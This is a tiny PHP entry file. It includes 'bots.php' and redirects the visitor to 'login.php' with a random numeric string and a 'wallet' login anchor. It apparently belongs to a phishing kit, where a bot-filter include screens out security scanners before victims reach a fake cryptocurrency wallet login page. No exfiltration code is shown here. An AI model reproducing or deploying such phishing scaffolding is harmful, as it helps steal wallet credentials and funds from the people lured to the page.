<?
include 'bots.php';
    header("Location: login.php?61473904298456wallet_#login");
?>